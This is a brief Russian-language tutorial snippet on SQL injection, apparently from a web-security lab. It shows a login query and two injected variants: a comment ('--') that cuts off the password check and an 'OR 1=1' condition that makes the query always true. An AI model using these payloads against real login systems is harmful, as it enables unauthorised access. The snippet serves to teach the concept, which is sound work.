Представьте запрос:

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Банальная проверка логина и пароля, но мы можем взять и выйти за пределы, а именно:

```
SELECT * FROM users WHERE username = 'wiener'--' AND password = 'bluecheese'
```

А еще лучше, если мы добавим 100% условие выполнения:

```
SELECT * FROM users WHERE username = 'wiener'OR 1=1 --' AND password = 'bluecheese'
```
